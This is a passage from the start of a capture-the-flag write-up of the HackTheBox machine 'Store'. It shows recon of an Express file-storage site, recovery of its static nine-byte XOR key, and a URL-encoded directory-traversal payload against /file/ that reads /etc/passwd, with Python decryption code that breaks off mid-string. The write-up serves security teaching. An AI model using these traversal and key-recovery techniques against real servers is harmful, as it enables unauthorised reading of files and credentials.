@@ -1,0 +1,872 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Store</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-store">htb-store</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#cyberchef">cyberchef</a> <a class="post-tag" href="/tags#upload">upload</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#xor-encryption">xor-encryption</a> <a class="post-tag" href="/tags#directory-traversal">directory-traversal</a> <a class="post-tag" href="/tags#file-read">file-read</a> <a class="post-tag" href="/tags#node">node</a> <a class="post-tag" href="/tags#node-inspect">node-inspect</a> <a class="post-tag" href="/tags#sftp">sftp</a> <a class="post-tag" href="/tags#sftp-tunnel">sftp-tunnel</a> <a class="post-tag" href="/tags#tunnel">tunnel</a> <a class="post-tag" href="/tags#chrome-debug">chrome-debug</a> <a class="post-tag" href="/tags#htb-sightless">htb-sightless</a> <a class="post-tag" href="/tags#htb-agile">htb-agile</a> <a class="post-tag" href="/tags#claude">claude</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-10-30T09:00:00+00:00" itemprop="datePublished">Oct 30, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/10/30/htb-store.html" style="color: #e6e6e6; text-decoration: none;">HTB: Store</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/store-cover.webp" type="image/webp"/>
+<img alt="Store" class="include_image" loading="lazy" src="/img/store-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Store has an ExpressJS website that offers file storage with military grade encryption. I’ll upload and retrieve files, but also find a way to leak the encrypted version of the files. The encryption is just a static nine-byte xor. I’ll find a way to directory traverse to leak files, but they are encrypted with the same key. I’ll decrypt them to leak an SFTP password. I’ll use the SFTP access to tunnel to a localhost port offering the nodejs inspect debugger, and use that to get a shell on the box. There I’ll find Chrome running as root and abuse it’s debug port to get execution.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/790 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/store" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Store</a> <a href="https://hackthebox.com/machines/store" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-store.webp" type="image/webp"/> <img alt="Store" class="img-av" src="/icons/box-store.png"/></picture></a><br/><a href="https://hackthebox.com/machines/store" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1983942048278323674">28 Oct 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">28 Oct 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds four open TCP ports, SSH (22) and three HTTP (5000, 5001, 5002):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.31.17
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-28 03:15 UTC
+...[snip]...
+Nmap scan report for 10.129.31.17
+Host is up, received reset ttl 63 (0.023s latency).
+Scanned at 2025-10-28 03:15:19 UTC for 7s
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE       REASON
+22/tcp   open  ssh           syn-ack ttl 63
+5000/tcp open  upnp          syn-ack ttl 63
+5001/tcp open  commplex-link syn-ack ttl 63
+5002/tcp open  rfe           syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
+           Raw packets sent: 67991 (2.992MB) | Rcvd: 65650 (2.626MB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,5000,5001,5002 <span class="nt">-sCV</span> 10.129.31.17
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-28 03:15 UTC
+Nmap scan report for 10.129.31.17
+Host is up (0.023s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 30:68:b8:a8:f5:47:ca:bf:1a:23:97:d5:4c:77:97:da (ECDSA)
+|_  256 3f:83:9f:53:0a:49:db:00:d5:18:85:e9:2f:05:76:dd (ED25519)
+5000/tcp open  http    Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+5001/tcp open  http    Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+5002/tcp open  http    Node.js (Express middleware)
+|_http-title: Secure Encrypted Storage - 01001101 01101001 01101100 01101001...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.45 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH version</a>, the host is likely running Ubuntu 22.04 jammy LTS (or maybe 22.10 kinetic).</p>
+<p>All of the ports show a TTL of 63, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Linux one hop away.</p>
+<h3 id="website---tcp-5000--5001--5002">Website - TCP 5000 / 5001 / 5002</h3>
+<h4 id="site">Site</h4>
+<p>As far as I can tell, the three ports are hosting the same site, a “Secure Encrypted Storage” site:</p>
+<picture>
+<source srcset="/img/image-20251028223124522.webp" type="image/webp"/>
+<img alt="image-20251028223124522" class="include_image" loading="lazy" src="/img/image-20251028223124522.png"/>
+</picture>
+<p>The binary in the header decodes to “Military Grade” (not interesting):</p>
+<picture>
+<source srcset="/img/image-20251028223222122.webp" type="image/webp"/>
+<img alt="image-20251028223222122" class="include_image" loading="lazy" src="/img/image-20251028223222122.png"/>
+</picture>
+<p>Clicking “List Files” shows a pretty empty page:</p>
+<picture>
+<source srcset="/img/image-20251028223257564.webp" type="image/webp"/>
+<img alt="image-20251028223257564" class="include_image" loading="lazy" src="/img/image-20251028223257564.png"/>
+</picture>
+<p>“Upload Files” gives a form:</p>
+<picture>
+<source srcset="/img/image-20251028223328228.webp" type="image/webp"/>
+<img alt="image-20251028223328228" class="include_image" loading="lazy" src="/img/image-20251028223328228.png"/>
+</picture>
+<p>If I give it a file, it uploads and redirects to <code class="language-plaintext highlighter-rouge">/</code>. <code class="language-plaintext highlighter-rouge">/list</code> now shows the file:</p>
+<picture>
+<source srcset="/img/image-20251028223403511.webp" type="image/webp"/>
+<img alt="image-20251028223403511" class="include_image" loading="lazy" src="/img/image-20251028223403511.png"/>
+</picture>
+<p>Clicking leads to <code class="language-plaintext highlighter-rouge">/file/0xdf.png</code>, which shows the raw binary:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20251028223451726.webp" type="image/webp"/>
+<img alt="image-20251028223451726" class="include_image" loading="lazy" src="/img/image-20251028223451726.png" style="max-height: 300px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>The download link at the bottom saves the file as <code class="language-plaintext highlighter-rouge">data.bin</code>, but opening it shows the original PNG. It’s a bit of an odd download link, as the link is not to another URL on the site, but rather the base64 encoded data for the image is stored in the link itself:</p>
+<p><a href="/img/image-20251029071645672.png"><img alt="image-20251029071645672" src="/img/image-20251029071645672.png"/><em>Click for full size image</em></a></p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers show that this is ExpressJS (just like <code class="language-plaintext highlighter-rouge">nmap</code>):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1161</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">W/"489-WmtntEqn7sxOXR0efV6R4TvN9ws"</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 29 Oct 2025 02:30:38 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5</span>
+</code></pre></div></div>
+<p>The 404 is the <a href="/cheatsheets/404#express">default Express 404</a>:</p>
+<picture>
+<source srcset="/img/image-20251028224051561.webp" type="image/webp"/>
+<img alt="image-20251028224051561" class="include_image" loading="lazy" src="/img/image-20251028224051561.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site. I’m using <code class="language-plaintext highlighter-rouge">--dont-extract-links</code> because it creates noise, and giving it a lowercase wordlist because the server doesn’t seem to care about case (starting <code class="language-plaintext highlighter-rouge">feroxbuster</code> with the default list shows a bunch of case repeats):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.31.17:5000 <span class="nt">--dont-extract-links</span> <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
+<span class="go">                                                                                                                      
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.31.17:5000
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET       10l       15w        -c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l       87w     1161c http://10.129.31.17:5000/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET       10l       16w      179c http://10.129.31.17:5000/images =&gt; </span><span class="feroxbuster-yellow">http://10.129.31.17:5000/images/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET       10l       16w      173c http://10.129.31.17:5000/css =&gt; </span><span class="feroxbuster-yellow">http://10.129.31.17:5000/css/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET       10l       16w      173c http://10.129.31.17:5000/tmp =&gt; </span><span class="feroxbuster-yellow">http://10.129.31.17:5000/tmp/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l       51w      807c http://10.129.31.17:5000/upload
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l       65w     1509c http://10.129.31.17:5000/list
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 54s   106336/106336  0s      </span><span class="feroxbuster-green">found</span><span class="go">:6       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 53s    26584/26584   498/s   http://10.129.31.17:5000/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 54s    26584/26584   497/s   http://10.129.31.17:5000/images/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 54s    26584/26584   497/s   http://10.129.31.17:5000/css/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 54s    26584/26584   497/s   http://10.129.31.17:5000/tmp/
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/tmp</code> is interesting.</p>
+<h4 id="tmp">/tmp</h4>
+<p>If I brute force in this directory with some common extensions after uploading files, or just guess that perhaps my uploads are here, I’ll find that the same filenames are there, but the data is encrypted. For example, I’ll create a dummy file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"this is a test"</span> <span class="o">&gt;</span> test.txt
+</code></pre></div></div>
+<p>When I upload it, it’s on the site at <code class="language-plaintext highlighter-rouge">/file/test.txt</code>:</p>
+<picture>
+<source srcset="/img/image-20251029071157898.webp" type="image/webp"/>
+<img alt="image-20251029071157898" class="include_image" loading="lazy" src="/img/image-20251029071157898.png"/>
+</picture>
+<p>At <code class="language-plaintext highlighter-rouge">/tmp/test.txt</code>, there’s a file of the same length:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.129.31.17:5000/tmp/test.txt <span class="nt">-s</span> | xxd
+<span class="go">00000000: 3c05 5009 453e 3013 5968 195c 0911 5d    &lt;.P.E&gt;0.Yh.\..]
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>xxd test.txt 
+<span class="go">00000000: 7468 6973 2069 7320 6120 7465 7374 0a    this is a test.
+</span></code></pre></div></div>
+<p>It looks to be the encrypted copy.</p>
+<h4 id="theory">Theory</h4>
+<p>My theory of the website at this point is that site is encrypting files and storing them in <code class="language-plaintext highlighter-rouge">/tmp</code>, which isn’t meant to be available on the HTTP server. When a file is requested via <code class="language-plaintext highlighter-rouge">/file/&lt;filename&gt;</code>, the site is getting the encrypted file from <code class="language-plaintext highlighter-rouge">/tmp</code>, decrypting it, and returning it. That explains why the raw data is stored in the link, so it only has to be decrypted once.</p>
+<h2 id="auth-as-sftpuser">Auth as sftpuser</h2>
+<h3 id="arbitrary-file-read">Arbitrary File Read</h3>
+<h4 id="recover-encryption-key">Recover Encryption Key</h4>
+<p>Given that the encrypted file is the same length as the plaintext file, it’s likely using a stream cipher. It could be as simple as a static XOR key. I’ll do an experiment on a longer file I’ve uploaded from a Python terminal:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 3.12.3 (main, Aug 14 2025, 17:47:21) [GCC 13.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">requests</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.129.31.17:5000/tmp/0xdf.png</span><span class="sh">'</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">enc</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">content</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">len</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+<span class="go">49946
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/oxdf/Pictures/0xdf.png</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="go">...     pt = f.read()
+</span><span class="c">... 
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">len</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
+<span class="go">49946
+</span></code></pre></div></div>
+<p>I’ll XOR the plaintext and the ciphertext to get a keystream:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">keystream</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="o">^</span> <span class="n">p</span> <span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">pt</span><span class="p">)]</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">keystream</span><span class="p">[:</span><span class="mi">100</span><span class="p">]</span>
+<span class="go">[72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72, 109, 57, 122, 101, 87, 67, 51, 56, 72]
+</span></code></pre></div></div>
+<p>It certainly looks like a pattern! It’s even all ASCII:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">keystream</span><span class="p">[:</span><span class="mi">40</span><span class="p">]])</span>
+<span class="go">'Hm9zeWC38Hm9zeWC38Hm9zeWC38Hm9zeWC38Hm9z'
+</span></code></pre></div></div>
+<p>Looks like the key is a rotating nine characters: “Hm9zeWC38”. I can check this on another file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.129.31.17:5000/tmp/test.txt</span><span class="sh">'</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">enc</span> <span class="o">=</span> <span class="n">resp</span><span class="p">.</span><span class="n">content</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">len</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+<span class="go">15
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">e</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span><span class="p">,</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">keystream</span><span class="p">))</span>
+<span class="go">'this is a test\n'
+</span></code></pre></div></div>
+<p>It looks like the same key is used for all files.</p>
+<h4 id="directory-traversal">Directory Traversal</h4>
+<p>To check for directory traversal, I’ll use a “LFI” (though not really LFI) wordlist from <a href="https://github.com/danielmiessler/SecLists">SecLists</a> on both <code class="language-plaintext highlighter-rouge">/tmp</code> and <code class="language-plaintext highlighter-rouge">/file</code>, as both are likely reading files from the file system. <code class="language-plaintext highlighter-rouge">/tmp</code> doesn’t find anything, but <code class="language-plaintext highlighter-rouge">/file</code> does:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.31.17:5000/file/ <span class="nt">-w</span> /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt <span class="nt">-s</span> 200
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.31.17:5000/file/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+ 👌  Status Codes          │ [200]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        1l       30w      567c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       22l      186w     5593c http://10.129.31.17:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 9s       933/933     0s      </span><span class="feroxbuster-green">found</span><span class="go">:1       </span><span class="feroxbuster-red">errors</span><span class="go">:824    
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 8s       930/930     113/s   http://10.129.31.17:5000/file/       
+</span></code></pre></div></div>
+<p>URL-encoding the <code class="language-plaintext highlighter-rouge">/</code> characters seems to work. I can validate this manually in Burp Repeater:</p>
+<picture>
+<source srcset="/img/image-20251029090443072.webp" type="image/webp"/>
+<img alt="image-20251029090443072" class="include_image" loading="lazy" src="/img/image-20251029090443072.png"/>
+</picture>
+<p>It works. But the file is encrypted:</p>
+<picture>
+<source srcset="/img/image-20251029090459565.webp" type="image/webp"/>
+<img alt="image-20251029090459565" class="include_image" loading="lazy" src="/img/image-20251029090459565.png"/>
+</picture>
+<p>That’s because the <code class="language-plaintext highlighter-rouge">/file</code>path is “decrypting” the files before returning them. In this case, “decrypting” an unencrypted file is encrypting it.</p>
+<h4 id="decrypt">Decrypt</h4>
+<p>If it is XORed with the same keystream, I can decrypt it. I’ll grab the base64-encoded version from the link in the HTML response, and drop that into Python:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">enc</span> <span class="o">=</span> <span class="nf">b64decode</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">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